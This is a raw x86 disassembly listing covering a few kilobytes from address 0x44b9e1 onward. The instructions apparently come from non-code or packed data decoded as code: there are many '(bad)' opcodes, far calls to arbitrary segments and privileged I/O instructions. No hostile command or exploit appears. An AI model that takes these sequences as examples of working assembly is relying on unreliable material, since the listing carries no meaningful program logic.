  44b9e1:	mov    dl,0x55
  44b9e3:	(bad)  
  44b9e4:	scas   al,BYTE PTR es:[edi]
  44b9e5:	add    edx,0x1e
  44b9e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44b9e9:	pop    ecx
  44b9ea:	int3   
  44b9eb:	call   0x4326:0x5a86847c
  44b9f2:	and    esi,ebp
  44b9f4:	ins    BYTE PTR es:[edi],dx
  44b9f5:	test   eax,0xa9ad6c3
  44b9fa:	inc    esi
  44b9fb:	jle    0x44b991
  44b9fd:	les    edi,FWORD PTR [eax+0x26bd4d4a]
  44ba03:	mov    BYTE PTR [esi+0x9],ch
  44ba06:	add    al,dh
  44ba08:	mov    BYTE PTR [ebp-0x60aabfc2],dh
  44ba0e:	mov    al,ds:0x3b06b94e
  44ba13:	sbb    al,ah
  44ba15:	aas    
  44ba16:	das    
  44ba17:	pop    ebx
  44ba18:	xlat   BYTE PTR ds:[ebx]
  44ba19:	adc    BYTE PTR ss:[ebx+esi*4],cl
  44ba1d:	dec    edi
  44ba1e:	test   eax,0x4618468a
  44ba23:	aad    0x1c
  44ba25:	js     0x44b9db
  44ba27:	call   0x7c04:0x3aeaaad
  44ba2e:	push   es
  44ba2f:	mov    ds:0xf21a6ab0,eax
  44ba34:	push   ds
  44ba35:	inc    esi
  44ba36:	dec    edx
  44ba37:	imul   ecx,DWORD PTR ds:0x2e54b422,0xd6082ada
  44ba41:	push   0xffffffac
  44ba43:	mov    ah,0xa6
  44ba45:	xor    eax,0xb88222ad
  44ba4a:	ds call 0x7c0:0x90b20a84
  44ba52:	xchg   ecx,eax
  44ba53:	fsub   st,st(6)
  44ba55:	int    0x2e
  44ba57:	xchg   edx,eax
  44ba58:	leave  
  44ba59:	fs test al,0xe0
  44ba5c:	dec    ebx
  44ba5d:	mov    BYTE PTR [esi+0x458034cc],cl
  44ba63:	outs   dx,BYTE PTR ds:[esi]
  44ba64:	shr    BYTE PTR [eax-0x2149d9e6],0x6b
  44ba6b:	dec    ecx
  44ba6c:	jl     0x44ba82
  44ba6e:	mov    ah,0x42
  44ba70:	into   
  44ba71:	mov    dh,0x1
  44ba73:	mov    bl,0x81
  44ba75:	dec    edx
  44ba76:	dec    esi
  44ba77:	in     al,0x26
  44ba79:	icebp  
  44ba7a:	xchg   edx,eax
  44ba7b:	add    cl,BYTE PTR [edx-0x4387a702]
  44ba81:	pusha  
  44ba82:	test   al,0x20
  44ba84:	mov    ah,0x12
  44ba86:	mov    ds:0x40a72e70,al
  44ba8b:	adc    al,0x19
  44ba8d:	sahf   
  44ba8e:	push   0x5289954a
  44ba93:	cld    
  44ba94:	sub    BYTE PTR [eax+eax*1+0x16],0xf2
  44ba99:	adc    ah,cl
  44ba9b:	not    BYTE PTR [eax]
  44ba9d:	push   ds
  44ba9e:	inc    ebp
  44ba9f:	pusha  
  44baa0:	js     0x44bb16
  44baa2:	retf   0x844
  44baa5:	or     DWORD PTR [ebx],edi
  44baa7:	mov    WORD PTR [esi],fs
  44baa9:	nop
  44baaa:	push   eax
  44baab:	jl     0x44baad
  44baad:	sar    DWORD PTR ds:[edx+0x5a],1
  44bab1:	pop    esp
  44bab2:	or     BYTE PTR [eax+ecx*2-0x7c],0x42
  44bab7:	add    al,0xe2
  44bab9:	fist   DWORD PTR [esi]
  44babb:	je     0x44babd
  44babd:	inc    edi
  44babe:	and    dh,BYTE PTR [eax-0x759ffb56]
  44bac4:	not    BYTE PTR [ebx]
  44bac6:	cld    
  44bac7:	xchg   ebx,eax
  44bac8:	inc    eax
  44bac9:	mov    al,ds:0x7d7668d1
  44bace:	out    0x73,al
  44bad0:	ins    BYTE PTR es:[edi],dx
  44bad1:	pop    esi
  44bad2:	push   eax
  44bad3:	jo     0x44bb39
  44bad5:	adc    bl,BYTE PTR [eax]
  44bad7:	cwde   
  44bad8:	cmp    al,0x1e
  44bada:	aas    
  44badb:	add    BYTE PTR [edx+ecx*1-0x3d595563],dl
  44bae2:	adc    al,0xc6
  44bae4:	mov    edi,0xde62fc40
  44bae9:	push   es
  44baea:	pop    ecx
  44baeb:	pop    ds
  44baec:	shr    al,1
  44baee:	mov    bh,0xa6
  44baf0:	les    ebp,FWORD PTR [edx]
  44baf2:	sbb    ebp,DWORD PTR [ebx+eax*1-0xffbd260]
  44baf9:	sub    al,0xa3
  44bafb:	xchg   esi,eax
  44bafc:	sub    BYTE PTR [edi+0xa],0x4e
  44bb00:	cmp    BYTE PTR [ebx-0x2d],al
  44bb03:	xor    al,0x34
  44bb05:	mov    bh,0xf4
  44bb07:	xchg   BYTE PTR [edx-0x20],ch
  44bb0a:	push   ss
  44bb0b:	mov    dh,0xfd
  44bb0d:	xor    BYTE PTR [esi],0x4d
  44bb10:	pushf  
  44bb11:	add    cl,BYTE PTR [eax-0x345bdd29]
  44bb17:	loopne 0x44bb24
  44bb19:	sahf   
  44bb1a:	inc    ecx
  44bb1b:	mov    dh,0xb0
  44bb1d:	mov    ah,0xc6
  44bb1f:	xor    al,BYTE PTR [eax]
  44bb21:	dec    esp
  44bb22:	in     eax,dx
  44bb23:	mov    WORD PTR [ebx+0x48],es
  44bb26:	fwait
  44bb27:	push   es
  44bb28:	retf   0xf958
  44bb2b:	outs   dx,BYTE PTR ds:[esi]
  44bb2c:	push   esp
  44bb2d:	hlt    
  44bb2e:	call   0xb650:0x6b5a9a10
  44bb35:	outs   dx,DWORD PTR ds:[esi]
  44bb36:	imul   esp,DWORD PTR [eax-0x45],0x16a21e14
  44bb3d:	sub    cl,ch
  44bb3f:	loope  0x44bb03
  44bb41:	(bad)  
  44bb42:	sahf   
  44bb43:	add    BYTE PTR [esi+ebp*1],0x9a
  44bb47:	inc    esi
  44bb48:	adc    cl,dh
  44bb4a:	sub    al,BYTE PTR [edi+0x165e66d0]
  44bb50:	std    
  44bb51:	add    BYTE PTR [edx+0x7b],dh
  44bb54:	pop    esi
  44bb55:	xchg   DWORD PTR ds:[edx+ebp*1-0x764f45d4],esp
  44bb5d:	add    DWORD PTR [edx+0x56],0x56
  44bb61:	fmul   QWORD PTR ds:0x4d07c468
  44bb67:	ror    al,cl
  44bb69:	out    dx,al
  44bb6a:	xchg   edi,eax
  44bb6b:	pop    edx
  44bb6c:	xor    esi,DWORD PTR [edi+ebp*2]
  44bb6f:	es adc eax,0x10937a00
  44bb75:	out    0x64,al
  44bb77:	xlat   BYTE PTR ds:[ebx]
  44bb78:	rcl    BYTE PTR [edi-0x26],1
  44bb7b:	dec    edi
  44bb7c:	dec    ebx
  44bb7d:	fdiv   st,st(4)
  44bb7f:	xlat   BYTE PTR ds:[ebx]
  44bb80:	pop    ecx
  44bb81:	pusha  
  44bb82:	out    0x55,eax
  44bb84:	or     cl,bl
  44bb86:	pop    edx
  44bb87:	mov    al,ds:0x6c9a6426
  44bb8c:	jmp    0x44bbcb
  44bb8e:	dec    ebp
  44bb8f:	sub    cl,ch
  44bb91:	adc    BYTE PTR [edx-0xc891711],0x0
  44bb98:	das    
  44bb99:	and    eax,0x9b758e6d
  44bb9e:	and    BYTE PTR [ecx+0x67],bh
  44bba1:	push   eax
  44bba2:	inc    ecx
  44bba3:	mov    ch,0x2f
  44bba5:	je     0x44bc24
  44bba7:	(bad)  
  44bba8:	inc    esi
  44bbaa:	aas    
  44bbab:	dec    ecx
  44bbac:	lods   eax,DWORD PTR ds:[esi]
  44bbad:	js     0x44bbb3
  44bbaf:	cld    
  44bbb0:	test   DWORD PTR [eax+0x7],ebx
  44bbb3:	mov    eax,ds:0x74946524
  44bbb8:	inc    esi
  44bbb9:	or     ecx,DWORD PTR [eax-0x3e]
  44bbbc:	add    al,BYTE PTR ds:0x36c27c64
  44bbc2:	adc    esp,ebp
  44bbc4:	inc    eax
  44bbc5:	mov    ch,0xed
  44bbc7:	pop    edx
  44bbc8:	repnz pop ss
  44bbca:	mov    eax,0xd7687fb
  44bbcf:	mov    ah,0x5d
  44bbd1:	fstp   TBYTE PTR [edx-0x68]
  44bbd4:	jl     0x44bbef
  44bbd6:	rol    BYTE PTR [ebx-0x12],cl
  44bbd9:	inc    esp
  44bbda:	mov    esi,DWORD PTR [ebp+0x6a82bc4d]
  44bbe0:	dec    eax
  44bbe1:	imul   DWORD PTR [ecx+eiz*1-0x50]
  44bbe5:	jns    0x44bbbc
  44bbe7:	dec    esp
  44bbe8:	adc    cl,dh
  44bbea:	imul   eax,DWORD PTR [eax],0xb445d250
  44bbf0:	push   0xdbd2e080
  44bbf5:	je     0x44bb85
  44bbf7:	dec    ebp
  44bbf8:	xchg   ebx,eax
  44bbf9:	lods   eax,DWORD PTR ds:[esi]
  44bbfa:	arpl   WORD PTR [edx],cx
  44bbfc:	retf   0x6cbd
  44bbff:	mov    eax,ds:0xe22f970
  44bc04:	scas   al,BYTE PTR es:[edi]
  44bc05:	add    BYTE PTR [eax],0xa2
  44bc08:	or     DWORD PTR ds:0x12ab364a,eax
  44bc0e:	fcmove st,st(2)
  44bc10:	jo     0x44bc82
  44bc12:	loop   0x44bc31
  44bc14:	call   0xb153:0x521af294
  44bc1b:	rcr    BYTE PTR [eax+0x6],0xe
  44bc1f:	add    cl,BYTE PTR [esi+0x34040e8c]
  44bc25:	jecxz  0x44bbf9
  44bc27:	ss push ss
  44bc29:	add    BYTE PTR [esi+0x3d],bl
  44bc2c:	or     cl,ah
  44bc2e:	adc    esp,0x2ad726f8
  44bc34:	rol    BYTE PTR [eax],1
  44bc36:	or     eax,0xe6acb60d
  44bc3b:	das    
  44bc3c:	jno    0x44bc1a
  44bc3e:	mov    bh,0x1a
  44bc40:	inc    ecx
  44bc41:	test   al,0x5e
  44bc43:	mov    al,ds:0x6180a236
  44bc48:	sub    eax,0x1e3a34e0
  44bc4d:	cmp    ah,cl
  44bc4f:	nop
  44bc50:	jle    0x44bc9d
  44bc52:	ret    0x42ec
  44bc55:	in     al,0x42
  44bc57:	xchg   ebp,eax
  44bc58:	add    BYTE PTR [ebx+0x76],dl
  44bc5b:	inc    esi
  44bc5c:	jp     0x44bc04
  44bc5e:	das    
  44bc5f:	pusha  
  44bc60:	ins    DWORD PTR es:[edi],dx
  44bc61:	xchg   edi,eax
  44bc62:	fcom   DWORD PTR [eax+0x52]
  44bc65:	and    ebx,esi
  44bc67:	mov    dh,ah
  44bc69:	rol    DWORD PTR [ebx+0x7c0247d0],cl
  44bc6f:	hlt    
  44bc70:	test   ecx,0x84f59438
  44bc76:	and    al,0xfb
  44bc78:	inc    esp
  44bc79:	int    0x34
  44bc7b:	mov    eax,0xf030874c
  44bc80:	mov    ch,dh
  44bc82:	(bad)  
  44bc83:	daa    
  44bc84:	sbb    BYTE PTR [edi],0x40
  44bc87:	shr    DWORD PTR [ecx+0xfb6ce2b],cl
  44bc8d:	test   BYTE PTR [ecx-0x4dfd6d48],cl
  44bc93:	pop    esi
  44bc94:	cmp    eax,0x84056889
  44bc99:	pop    ss
  44bc9a:	cs cdq 
  44bc9c:	lods   al,BYTE PTR ds:[esi]
  44bc9d:	mov    ah,0xe8
  44bc9f:	daa    
  44bca0:	mov    cl,0xa0
  44bca2:	dec    esp
  44bca3:	xlat   BYTE PTR ds:[ebx]
  44bca4:	pusha  
  44bca5:	dec    esp
  44bca6:	stc    
  44bca7:	mov    BYTE PTR [edx-0xb],dl
  44bcaa:	aad    0xda
  44bcac:	mov    ah,BYTE PTR [edi-0x1c]
  44bcaf:	push   es
  44bcb0:	push   0xfffffff0
  44bcb2:	arpl   sp,bx
  44bcb4:	in     eax,dx
  44bcb5:	push   ss
  44bcb6:	ja     0x44bd2b
  44bcb8:	sar    BYTE PTR [eax-0x5c],0x18
  44bcbc:	fadd   st,st(6)
  44bcbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44bcbf:	nop
  44bcc0:	push   ecx
  44bcc1:	rcr    BYTE PTR [edx-0x2c],1
  44bcc4:	jbe    0x44bd1b
  44bcc6:	pop    esi
  44bcc7:	mov    esp,0x3eb24596
  44bccc:	inc    ebx
  44bccd:	jmp    0xd160:0xb00cf892
  44bcd4:	or     DWORD PTR [ecx+0x6a9afe4f],0x5f38f440
  44bcde:	lock dec ebp
  44bce0:	bound  edi,QWORD PTR [ebx-0x11]
  44bce3:	dec    BYTE PTR [esp-0x12ff8aec]
  44bcea:	not    DWORD PTR [edx+edx*1]
  44bced:	sbb    esi,DWORD PTR [edx]
  44bcef:	and    BYTE PTR [edi+ecx*2+0xb],bh
  44bcf3:	or     eax,0xb4ff8286
  44bcf8:	(bad)  
  44bcfa:	and    BYTE PTR [edx+0x70ea828d],dh
  44bd00:	fwait
  44bd01:	mov    al,ds:0x3c409609
  44bd06:	xchg   esi,eax
  44bd07:	sub    ah,BYTE PTR [edx+0x64457051]
  44bd0d:	icebp  
  44bd0e:	test   BYTE PTR [edi+0x750f0c0b],ah
  44bd14:	sbb    ch,BYTE PTR [eax]
  44bd16:	cli    
  44bd17:	sub    BYTE PTR [eax],cl
  44bd19:	push   esp
  44bd1a:	jbe    0x44bcc6
  44bd1c:	data16 mov ah,0x43
  44bd1f:	dec    edx
  44bd20:	pusha  
  44bd21:	push   ecx
  44bd22:	pop    eax
  44bd23:	xchg   edx,eax
  44bd24:	jb     0x44bcf9
  44bd26:	clc    
  44bd27:	test   BYTE PTR ds:0xf2641628,dl
  44bd2d:	call   0xc0e8:0xb1361657
  44bd34:	cwde   
  44bd35:	dec    edx
  44bd36:	popa   
  44bd37:	or     al,0x1f
  44bd39:	and    ebx,ebp
  44bd3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44bd3c:	test   DWORD PTR [ebp+0x3699bbbe],edx
  44bd42:	pop    esp
  44bd43:	enter  0x64f8,0x94
  44bd47:	popf   
  44bd48:	mov    bl,BYTE PTR [edi]
  44bd4a:	outs   dx,BYTE PTR ds:[esi]
  44bd4b:	retf   
  44bd4c:	int3   
  44bd4d:	mov    al,ds:0x3ca28781
  44bd52:	xchg   ecx,eax
  44bd53:	mov    BYTE PTR [eax+0x61],bh
  44bd56:	ins    BYTE PTR es:[edi],dx
  44bd57:	cli    
  44bd58:	ret    0xa4b
  44bd5b:	int    0x37
  44bd5d:	nop
  44bd5e:	sar    DWORD PTR [edx],1
  44bd60:	mov    cl,0xca
  44bd62:	ret    0xb240
  44bd65:	pop    esp
  44bd66:	push   edi
  44bd67:	daa    
  44bd68:	(bad)  
  44bd69:	dec    esi
  44bd6a:	fist   DWORD PTR ds:0xbfb25bb4
  44bd70:	dec    ebp
  44bd71:	jmp    0x9b46df78
  44bd76:	fwait
  44bd77:	ror    BYTE PTR [esi+ecx*4+0x1e],cl
  44bd7b:	add    BYTE PTR [ecx],ah
  44bd7d:	xchg   ecx,eax
  44bd7e:	pop    ecx
  44bd7f:	jmp    0xbe70821c
  44bd84:	rcr    DWORD PTR ds:0x42ac371a,cl
  44bd8a:	mov    ds:0xb49df4a3,eax
  44bd8f:	inc    edi
  44bd90:	and    al,0xfb
  44bd92:	jo     0x44bdb9
  44bd94:	call   0x975333aa
  44bd99:	cli    
  44bd9a:	ja     0x44bd9c
  44bd9c:	cs xor eax,0xa06a0621
  44bda2:	adc    ch,0xd0
  44bda5:	add    DWORD PTR [edx+ebx*4-0x223b56cf],esi
  44bdac:	and    BYTE PTR [esi-0x79],bl
  44bdaf:	sbb    BYTE PTR [esi],0x18
  44bdb2:	mov    WORD PTR [ebx],fs
  44bdb4:	pop    edx
  44bdb5:	xchg   bl,bh
  44bdb7:	jmp    0x44bdea
  44bdb9:	or     al,0xb4
  44bdbb:	adc    bh,BYTE PTR [edi+edi*4+0x40]
  44bdbf:	jmp    0x44bd82
  44bdc1:	out    0x5f,al
  44bdc3:	jo     0x44be05
  44bdc5:	lock scas eax,DWORD PTR es:[edi]
  44bdc7:	scas   al,BYTE PTR es:[edi]
  44bdc8:	fsubr  QWORD PTR ds:0x9a4f00
  44bdce:	int3   
  44bdcf:	add    al,0x8
  44bdd1:	shl    BYTE PTR [ecx],0xa9
  44bdd4:	mov    dl,0x52
  44bdd6:	inc    ebp
  44bdd7:	mov    ch,0xe
  44bdd9:	inc    eax
  44bdda:	mov    ds:0x39de868c,al
  44bddf:	pop    eax
  44bde0:	push   0xb82429be
  44bde5:	pop    esi
  44bde6:	cmp    al,BYTE PTR [esi]
  44bde8:	add    BYTE PTR [eax+0x1d],ah
  44bdeb:	inc    esi
  44bdec:	mov    dh,0xb5
  44bdee:	addr16 xchg ecx,eax
  44bdf0:	call   0x65369a98
  44bdf5:	fs scas eax,DWORD PTR es:[edi]
  44bdf7:	cs pop es
  44bdf9:	adc    DWORD PTR [edi],ebp
  44bdfb:	mov    dl,al
  44bdfd:	push   edx
  44bdfe:	out    0x8f,al
  44be00:	add    al,BYTE PTR [ebx-0x6a3ebaba]
  44be06:	out    0x2a,eax
  44be08:	dec    eax
  44be09:	push   edx
  44be0a:	cmp    DWORD PTR [eax],0x3aeab084
  44be10:	mov    edi,0xe4203e36
  44be15:	dec    eax
  44be16:	ins    DWORD PTR es:[edi],dx
  44be17:	je     0x44bdb3
  44be19:	push   0x14
  44be1b:	xlat   BYTE PTR ds:[ebx]
  44be1c:	sub    BYTE PTR [edx-0x7fdd840],dl
  44be22:	out    0x88,al
  44be24:	dec    edi
  44be25:	mov    ch,BYTE PTR [eax+0x45]
  44be28:	fbld   TBYTE PTR [eax]
  44be2a:	push   ds
  44be2b:	mov    DWORD PTR [esi+eiz*4],ecx
  44be2e:	jno    0x44be12
  44be30:	adc    BYTE PTR [edi+0x64680215],dl
  44be36:	pop    esi
  44be37:	pop    eax
  44be38:	sub    BYTE PTR cs:[esi+0x6ca46031],al
  44be3f:	enter  0xf4e2,0x9e
  44be43:	stos   BYTE PTR es:[edi],al
  44be44:	xchg   esp,eax
  44be45:	mov    al,0x48
  44be47:	or     eax,ebx
  44be49:	(bad)  
  44be4b:	xor    ch,ch
  44be4d:	mov    ds:0x7d9e3c40,eax
  44be52:	je     0x44be70
  44be54:	popf   
  44be55:	jp     0x44bebb
  44be57:	shr    esp,0xb3
  44be5a:	icebp  
  44be5b:	or     DWORD PTR [ebp+edx*8-0x1aefd142],ecx
  44be62:	hlt    
  44be63:	call   0x606782f8
  44be68:	scas   al,BYTE PTR es:[edi]
  44be69:	add    DWORD PTR [edi-0x60],ebx
  44be6c:	push   ds
  44be6d:	adc    bh,BYTE PTR [edx+eiz*2-0x3e98b80]
  44be74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44be75:	adc    BYTE PTR ds:0x88258c1c,0xb8
  44be7c:	sbb    ecx,DWORD PTR [ebx]
  44be7e:	call   0xa228:0x348b2817
  44be85:	push   ebx
  44be86:	mulps  xmm0,xmm5
  44be89:	dec    edi
  44be8a:	inc    eax
  44be8b:	jmp    0x90dc:0xe6d66d72
  44be92:	push   eax
  44be93:	aad    0x65
  44be95:	dec    eax
  44be96:	lock xor BYTE PTR [ecx+0x38],bh
  44be9a:	sub    BYTE PTR [ebp-0x5181a108],0x80
  44bea1:	cmp    al,0x58
  44bea3:	fsubr  QWORD PTR [esi]
  44bea5:	xor    al,0x96
  44bea7:	test   DWORD PTR [edi],ebx
  44bea9:	mov    BYTE PTR [eax-0x5f2d4ed8],cl
  44beaf:	ret    0x6021
  44beb2:	ds nop
  44beb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44beb5:	push   esp
  44beb6:	mov    cl,0x25
  44beb8:	add    al,0x9a
  44beba:	dec    esp
  44bebb:	push   ebx
  44bebc:	inc    ecx
  44bebd:	popf   
  44bebe:	cmc    
  44bebf:	adc    BYTE PTR [edx+ebx*1],al
  44bec2:	imul   edx,DWORD PTR [eax+0x40],0x1c3b523a
  44bec9:	mov    al,ds:0xcc24c8cc
  44bece:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44becf:	mov    ah,0xa2
  44bed1:	cmp    ebp,DWORD PTR es:[esi-0x7a]
  44bed5:	aad    0xf5
  44bed7:	pop    ecx
  44bed8:	sub    BYTE PTR [edx+eiz*4-0x70a5d068],ch
  44bedf:	dec    eax
  44bee0:	jge    0x44be6a
  44bee2:	xor    cl,BYTE PTR ds:0xe303368a
  44bee8:	rcl    ah,cl
  44beea:	pop    es
  44beeb:	cwde   
  44beec:	cmp    bl,BYTE PTR [ecx]
  44beee:	enter  0xd80f,0xf4
  44bef2:	lods   eax,DWORD PTR ds:[esi]
  44bef3:	es cmp al,0x1c
  44bef6:	data16 icebp 
  44bef8:	jbe    0x44bf05
  44befa:	add    al,0x4d
  44befc:	aad    0x6f
  44befe:	add    ah,al
  44bf00:	retf   
  44bf01:	mov    cl,0x1e
  44bf03:	xor    bh,BYTE PTR [edi+0x340c7a4a]
  44bf09:	and    al,0xbc
  44bf0b:	push   esp
  44bf0c:	ss cs aad 0x8
  44bf10:	cmp    al,0x0
  44bf12:	pop    eax
  44bf13:	mov    al,0xc9
  44bf15:	fimul  WORD PTR ds:[esi]
  44bf18:	mov    dl,BYTE PTR [esi+esi*1-0x28]
  44bf1c:	sbb    ah,dl
  44bf1e:	scas   al,BYTE PTR es:[edi]
  44bf1f:	pop    esi
  44bf20:	in     al,dx
  44bf21:	push   ss
  44bf22:	hlt    
  44bf23:	mov    ah,0x5c
  44bf25:	jo     0x44bf11
  44bf27:	rol    DWORD PTR [ebp+0x16],0xe
  44bf2b:	and    dh,cl
  44bf2d:	out    dx,al
  44bf2e:	sbb    al,0x54
  44bf30:	mov    eax,edx
  44bf32:	or     ecx,DWORD PTR [eax]
  44bf34:	mov    ah,0x74
  44bf36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44bf37:	sub    BYTE PTR [esp+eax*1],bh
  44bf3a:	hlt    
  44bf3b:	mov    dh,0x78
  44bf3d:	mov    al,0x1e
  44bf3f:	jl     0x44befb
  44bf41:	icebp  
  44bf42:	xchg   edx,eax
  44bf43:	xchg   esp,eax
  44bf44:	sub    eax,0x47e0c46
  44bf49:	outs   dx,BYTE PTR ds:[esi]
  44bf4a:	xchg   edx,eax
  44bf4b:	xchg   edx,eax
  44bf4c:	cli    
  44bf4d:	and    al,0x36
  44bf4f:	or     ah,bl
  44bf51:	mov    gs,WORD PTR [eax]
  44bf53:	mov    ds:0x58126c43,al
  44bf58:	adc    BYTE PTR [edx-0x6f],bl
  44bf5b:	fcom   st(0)
  44bf5d:	fcom   QWORD PTR [edx-0x67e9ebf8]
  44bf63:	nop
  44bf64:	push   es
  44bf65:	ror    DWORD PTR ss:[eax],cl
  44bf68:	call   0xd2f5:0x86fc21a9
  44bf6f:	sahf   
  44bf70:	mov    bh,0x2
  44bf72:	rcr    DWORD PTR [ebx-0xc],0xd
  44bf76:	jmp    0x44bf7f
  44bf78:	cs cmp bh,ah
  44bf7b:	or     bh,cl
  44bf7d:	push   ecx
  44bf7e:	in     eax,dx
  44bf7f:	inc    edx
  44bf80:	pop    edx
  44bf81:	dec    edx
  44bf82:	shr    ch,1
  44bf84:	shl    BYTE PTR [esi+0x52],1
  44bf87:	add    DWORD PTR [edi+0x33],eax
  44bf8a:	dec    eax
  44bf8b:	push   0x5a
  44bf8d:	push   0x60cc512e
  44bf92:	fidivr WORD PTR [ebx+ebp*2-0x5f07dc87]
  44bf99:	add    BYTE PTR [ebp+0x29],bh
  44bf9c:	retf   0x8100
  44bf9f:	dec    edi
  44bfa0:	cmp    ebx,DWORD PTR [esi]
  44bfa2:	dec    edx
  44bfa3:	fcomp  DWORD PTR [edx]
  44bfa5:	test   DWORD PTR [ebp+0x56],edi
  44bfa8:	mov    DWORD PTR [ebx-0x4],edi
  44bfab:	clc    
  44bfac:	add    dh,dl
  44bfae:	mov    WORD PTR [eax+0x618df9],es
  44bfb4:	adc    esi,edx
  44bfb6:	out    0x9a,al
  44bfb8:	xchg   ebp,eax
  44bfb9:	mov    BYTE PTR [eax+0x49],dh
  44bfbc:	add    al,0xb5
  44bfbe:	sbb    ecx,DWORD PTR [edx]
  44bfc0:	cdq    
  44bfc1:	sub    ah,al
  44bfc3:	fs push esp
  44bfc5:	push   eax
  44bfc6:	push   0x8c822314
  44bfcb:	and    DWORD PTR [ebx-0x66],eax
  44bfce:	clc    
  44bfcf:	nop
  44bfd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44bfd1:	(bad)  
  44bfd2:	sti    
  44bfd3:	lock push ecx
  44bfd5:	adc    BYTE PTR [edx],bl
  44bfd7:	mov    dl,0x6f
  44bfd9:	stos   BYTE PTR es:[edi],al
  44bfda:	xor    eax,DWORD PTR [ebp-0x4a]
  44bfdd:	mov    BYTE PTR [edi],cl
  44bfdf:	add    dl,0x37
  44bfe2:	push   ebx
  44bfe3:	push   0xd87d011f
  44bfe8:	leave  
  44bfe9:	fwait
  44bfea:	xor    al,BYTE PTR [ecx+eax*2-0x4b89e14e]
  44bff1:	inc    edi
  44bff2:	pop    ebx
  44bff3:	dec    eax
  44bff4:	inc    edi
  44bff5:	cs std 
  44bff7:	imul   BYTE PTR [edx+edi*4-0x7e]
  44bffb:	adc    edi,DWORD PTR [edx+0xec9eca2]
  44c001:	scas   eax,DWORD PTR es:[edi]
  44c002:	inc    ebp
  44c003:	je     0x44bfcf
  44c005:	cmp    al,0x4d
  44c007:	jbe    0x44bfcd
  44c009:	arpl   WORD PTR [ecx+0x403c01],bp
  44c00f:	shl    BYTE PTR [edx],1
  44c011:	daa    
  44c012:	jecxz  0x44bf95
  44c014:	mov    ch,0xac
  44c016:	push   eax
  44c017:	mov    BYTE PTR [ebx+ebx*4+0xe059629],ch
  44c01e:	shl    BYTE PTR [esi-0x228d0504],0x46
  44c025:	aam    0x8a
  44c027:	in     al,dx
  44c028:	mov    eax,ds:0x3bad07e3
  44c02d:	add    BYTE PTR [edi-0x54],dl
  44c030:	cld    
  44c031:	xor    bl,BYTE PTR [edx+0x5a04fb21]
  44c037:	adc    DWORD PTR [edi],eax
  44c039:	shl    BYTE PTR [edx+0x48e960e2],1
  44c03f:	es lock mov esi,0xcd1d0815
  44c046:	sbb    BYTE PTR [esi+0x40],al
  44c049:	xor    cl,bl
  44c04b:	sub    BYTE PTR [esi+0x6b],bh
  44c04e:	test   DWORD PTR [ecx-0x6c],edx
  44c051:	sub    BYTE PTR [esi],bh
  44c053:	pop    eax
  44c054:	push   ebp
  44c055:	jp     0x44c0bf
  44c057:	fdiv   DWORD PTR [ecx+0x6d]
  44c05a:	fidivr WORD PTR [eax+0x48]
  44c05d:	inc    esi
  44c05e:	js     0x44c016
  44c060:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44c061:	popa   
  44c062:	adc    eax,0xccfc80e9
  44c067:	mov    WORD PTR [ecx+0x3b],es
  44c06a:	inc    esp
  44c06b:	mov    dl,0xbe
  44c06d:	sub    al,0xc
  44c06f:	not    BYTE PTR [esi-0xe4df53f]
  44c075:	sub    DWORD PTR [edx],edx
  44c077:	jb     0x44c031
  44c079:	push   0xe5b6a0cf
  44c07e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44c07f:	popa   
  44c080:	cmp    BYTE PTR [ebx+0x283e2d46],ch
  44c086:	mov    al,ds:0x49b3b66d
  44c08b:	retf   0xee8c
  44c08e:	xchg   esp,eax
  44c08f:	(bad)  
  44c090:	lar    ebp,WORD PTR [ebx]
  44c093:	inc    esi
  44c094:	and    edi,DWORD PTR [esi+0x6c38d0dc]
  44c09a:	push   0xa418d745
  44c09f:	repnz pop edx
  44c0a1:	jl     0x44c07b
  44c0a3:	ds push esi
  44c0a5:	inc    edi
  44c0a6:	jbe    0x44c0b4
  44c0a8:	inc    BYTE PTR [eax]
  44c0aa:	lods   al,BYTE PTR ds:[esi]
  44c0ab:	inc    edx
  44c0ac:	retf   
  44c0ad:	add    al,al
  44c0af:	js     0x44c11d
  44c0b1:	aam    0xe2
  44c0b3:	inc    ebp
  44c0b4:	mov    esp,DWORD PTR [esi+0x3a]
  44c0b7:	push   ds
  44c0b8:	and    al,0x4c
  44c0ba:	ds mov ?,edx
  44c0bd:	mov    cl,0x52
  44c0bf:	add    esp,DWORD PTR [ebx-0x52efd44b]
  44c0c5:	mov    eax,0x789a202f
  44c0ca:	adc    dl,BYTE PTR [esi]
  44c0cc:	nop
  44c0cd:	add    al,0xc8
  44c0cf:	ret    0x29d5
  44c0d2:	xchg   edi,eax
  44c0d3:	pop    edx
  44c0d4:	cmp    DWORD PTR [edx],0xfffffff8
  44c0d7:	add    BYTE PTR [edx+0x57884a83],0xa2
  44c0de:	sub    dh,BYTE PTR [eax+0x50]
  44c0e1:	inc    BYTE PTR [edi+ecx*4]
  44c0e4:	mov    esp,0xbc13d403
  44c0e9:	sub    DWORD PTR [eax-0x75],esp
  44c0ec:	add    BYTE PTR [edi+0x11],bl
  44c0ef:	xor    eax,0x9c70286f
  44c0f4:	pusha  
  44c0f5:	mov    bh,0x62
  44c0f7:	in     eax,0x57
  44c0f9:	add    cl,cl
  44c0fb:	outs   dx,DWORD PTR ds:[esi]
  44c0fc:	call   0xb769:0x5e612a16
  44c103:	push   ecx
  44c104:	dec    esp
  44c105:	jmp    0x44c0f9
  44c107:	popf   
  44c108:	and    al,0xb5
  44c10a:	(bad)  
  44c10b:	push   esp
  44c10c:	jno    0x44c173
  44c10e:	jmp    0x44c0de
  44c110:	out    dx,al
  44c111:	inc    esp
  44c112:	pop    ss
  44c113:	push   0x23
  44c115:	lahf   
  44c116:	sub    al,0xa2
  44c118:	fnstcw WORD PTR [edx]
  44c11a:	test   eax,0xd9b01c6c
  44c11f:	xor    BYTE PTR [edx-0x21feb30c],al
  44c125:	mov    ds:0x6b22c290,eax
  44c12a:	into   
  44c12b:	push   0x593688e
  44c130:	sub    ah,bh
  44c132:	add    ah,dh
  44c134:	dec    esp
